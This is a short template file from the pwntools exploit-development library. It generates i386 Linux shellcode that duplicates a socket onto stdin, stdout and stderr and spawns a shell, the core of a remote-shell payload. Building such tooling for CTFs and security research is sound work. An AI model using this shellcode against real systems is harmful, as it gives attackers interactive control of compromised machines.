<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft.i386 import linux %>
<%page args="sock = None"/>
<%docstring>
"""Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr and spawns a shell."""
</%docstring>


${linux.dup(sock)}

${linux.sh()}
